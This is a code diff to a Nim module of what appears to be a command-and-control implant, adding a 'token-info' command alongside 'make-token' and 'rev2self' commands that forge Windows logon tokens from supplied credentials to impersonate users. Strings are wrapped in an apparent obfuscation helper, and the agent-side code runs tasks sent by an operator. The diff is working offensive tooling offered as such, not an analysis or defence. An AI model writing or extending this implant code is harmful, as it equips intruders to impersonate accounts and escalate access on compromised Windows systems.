@@ -3,6 +3,7 @@ import ../common/[types, utils]
 # Define function prototype
 proc executeMakeToken(ctx: AgentCtx, task: Task): TaskResult 
 proc executeRev2Self(ctx: AgentCtx, task: Task): TaskResult 
+proc executeTokenInfo(ctx: AgentCtx, task: Task): TaskResult 
 
 # Module definition
 let module* = Module(
@@ -25,10 +26,18 @@ let module* = Module(
         Command(
             name: protect("rev2self"),
             commandType: CMD_REV2SELF,
-            description: protect("Revert to previous access token."),
+            description: protect("Revert to original access token."),
             example: protect("rev2self"),
             arguments: @[],
             execute: executeRev2Self
+        ),
+        Command(
+            name: protect("token-info"),
+            commandType: CMD_TOKEN_INFO,
+            description: protect("Retrieve information about the current access token."),
+            example: protect("token-info"),
+            arguments: @[],
+            execute: executeTokenInfo
         )
     ]
 )  
@@ -37,6 +46,7 @@ let module* = Module(
 when not defined(agent):
     proc executeMakeToken(ctx: AgentCtx, task: Task): TaskResult = nil
     proc executeRev2Self(ctx: AgentCtx, task: Task): TaskResult = nil
+    proc executeTokenInfo(ctx: AgentCtx, task: Task): TaskResult = nil
 
 when defined(agent):
 
@@ -63,9 +73,6 @@ when defined(agent):
             if task.argCount == 3: 
                 logonType = cast[DWORD](Bytes.toUint32(task.args[2].data))
             
-            # Revert current token before creating a new one 
-            discard rev2self() 
-
             if not makeToken(userParts[1], password, userParts[0], logonType): 
                 return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(protect("Failed to create token.")))
             return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"Impersonated {username}."))
@@ -80,6 +87,16 @@ when defined(agent):
             if not rev2self(): 
                 return createTaskResult(task, STATUS_FAILED, RESULT_NO_OUTPUT, @[])
             return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
+
+        except CatchableError as err: 
+            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+        
+    proc executeTokenInfo(ctx: AgentCtx, task: Task): TaskResult = 
+        try: 
+            echo fmt"   [>] Retrieving token information."
+
+            let tokenInfo = getCurrentToken().getTokenInfo() 
+            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(tokenInfo))
 
         except CatchableError as err: 
             return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
